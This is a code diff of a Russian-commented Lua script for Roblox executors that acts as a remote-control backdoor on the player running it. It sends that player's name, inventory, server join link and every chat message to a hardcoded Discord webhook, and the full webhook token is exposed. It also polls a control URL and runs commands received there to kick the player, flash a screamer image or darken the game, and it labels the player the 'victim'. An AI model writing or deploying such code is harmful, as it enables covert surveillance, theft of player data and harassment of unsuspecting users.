@@ -1,75 +1,70 @@
 -- [[ CONFIG ]] --
-local webhook_url = "https://discord.com/api/webhooks/1463513332697927883/7XBUBBop6fsTyZvAfdCUKskGulE5z4MpXl_Q6Pa5Pqxg8Fdz7hRlnlF7PUzayceSrvF5"
--- Для чтения команд используем прокси, который видит описание твоего вебхука/канала
-local channel_id = "1463513332697927883" -- ID твоего канала
+local log_webhook = "https://discord.com/api/webhooks/1463513332697927883/7XBUBBop6fsTyZvAfdCUKskGulE5z4MpXl_Q6Pa5Pqxg8Fdz7hRlnlF7PUzayceSrvF5"
+local control_url = "ТВОЯ_ССЫЛКА_WEBHOOK_SITE" -- Копируй с сайта!
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local Lighting = game:GetService("Lighting")
 local lp = Players.LocalPlayer
 
--- Функция отправки логов
+-- Функция отправки отчетов
 local function sendLog(title, desc, color)
     pcall(function()
         local inv = ""
         for _, v in pairs(lp.Backpack:GetChildren()) do inv = inv .. "[" .. v.Name .. "] " end
-        local pos = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and lp.Character.HumanoidRootPart.Position or Vector3.new(0,0,0)
-        
         local data = {
             ["embeds"] = {{
                 ["title"] = title,
                 ["description"] = desc,
                 ["color"] = color or 0x00ffff,
                 ["fields"] = {
-                    {["name"] = "👤 Ник", ["value"] = "||"..lp.Name.."||", ["inline"] = true},
-                    {["name"] = "📍 Корды", ["value"] = math.floor(pos.X)..", "..math.floor(pos.Y)..", "..math.floor(pos.Z), ["inline"] = true},
-                    {["name"] = "🎒 Инвентарь", ["value"] = "```" .. (inv ~= "" and inv or "Пусто") .. "```"},
-                    {["name"] = "🔗 Сервер", ["value"] = "game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')"}
-                },
-                ["footer"] = {["text"] = "AxM Direct Control • " .. os.date("%X")}
+                    {["name"] = "👤 Жертва", ["value"] = lp.Name, ["inline"] = true},
+                    {["name"] = "🎒 Вещи", ["value"] = "```" .. (inv ~= "" and inv or "Empty") .. "```"},
+                    {["name"] = "🔗 Join Server", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')```"}
+                }
             }}
         }
         local req = request or http_request or (syn and syn.request)
-        if req then req({Url = webhook_url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
+        if req then req({Url = log_webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
     end)
 end
 
--- Чтение команд из Discord (через прокси описания канала)
+-- Чтение команд ИЗ ЧАТА Дискорда (через Webhook.site)
 task.spawn(function()
-    while task.wait(5) do
+    local last_msg = ""
+    while task.wait(3) do -- Проверка каждые 3 секунды
         pcall(function()
-            -- Мы запрашиваем данные о канале через прокси (например, RoProxy или аналоги)
-            -- В данном примере используем метод получения "Topic" канала
-            local response = game:HttpGet("https://roproxy.com/notifications/get-channel-info?id=" .. channel_id) 
-            local data = HttpService:JSONDecode(response)
-            local cmd = string.lower(data.topic or "")
+            local response = game:HttpGet(control_url)
+            -- Ищем текст сообщения в запросе
+            if response ~= last_msg and response ~= "" then
+                last_msg = response
+                local cmd = string.lower(response)
 
-            if string.find(cmd, "kick") then
-                local reason = string.match(cmd, "kick%s*%((.*)%)") or "Admin Remote Ban"
-                sendLog("💀 ВЫПОЛНЕН КИК", "Причина: " .. reason, 0xff0000)
-                lp:Kick("\n[AxM Security]\n" .. reason)
+                if string.find(cmd, "kick") then
+                    local reason = string.match(cmd, "kick%s*%((.*)%)") or "Disconnected"
+                    sendLog("💀 КИК ИЗ ЧАТА", "Причина: " .. reason, 0xff0000)
+                    lp:Kick("\n[AxM Security]\n" .. reason)
                 
-            elseif string.find(cmd, "screamer") then
-                local g = Instance.new("ScreenGui", lp.PlayerGui)
-                local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1.5,0,1.5,0); i.Position = UDim2.new(-0.25,0,-0.25,0)
-                i.Image = "rbxassetid://15518663806"
-                local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s:Play()
-                task.wait(0.5); g:Destroy()
-                sendLog("😱 ВЫПОЛНЕН СКРИМЕР", "Жертва напугана", 0xffffff)
+                elseif string.find(cmd, "screamer") then
+                    local g = Instance.new("ScreenGui", lp.PlayerGui)
+                    local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1.5,0,1.5,0); i.Position = UDim2.new(-0.25,0,-0.25,0)
+                    i.Image = "rbxassetid://15518663806"
+                    local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s:Play()
+                    task.wait(0.5); g:Destroy()
+                    sendLog("😱 СКРИМЕР ИЗ ЧАТА", "Выполнено", 0xffffff)
 
-            elseif string.find(cmd, "horror") then
-                Lighting.ClockTime = 0
-                local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://163721344"; s.Volume = 3; s:Play()
-                sendLog("🌑 ВЫПОЛНЕН УЖАС", "Тьма активирована", 0x000000)
+                elseif string.find(cmd, "horror") then
+                    Lighting.ClockTime = 0
+                    sendLog("🌑 УЖАС ИЗ ЧАТА", "Активировано", 0x000000)
+                end
             end
         end)
     end
 end)
 
--- Слежка за чатом
+-- Слежка за чатом Роблокса
 lp.Chatted:Connect(function(msg)
-    sendLog("💬 ЧАТ", "Написал: `" .. msg .. "`", 0x5555FF)
+    sendLog("💬 ЧАТ ИГРОКА", "Написал: `" .. msg .. "`", 0x5555FF)
 end)
 
--- Первая отправка при заходе
-sendLog("🛰️ ПОДКЛЮЧЕН", "Ожидаю команд в описании канала Discord.", 0x00FF00)
+sendLog("🛰️ MASTER-CONTROL ONLINE", "Пиши команды прямо в чат Дискорда!", 0x00FF00)
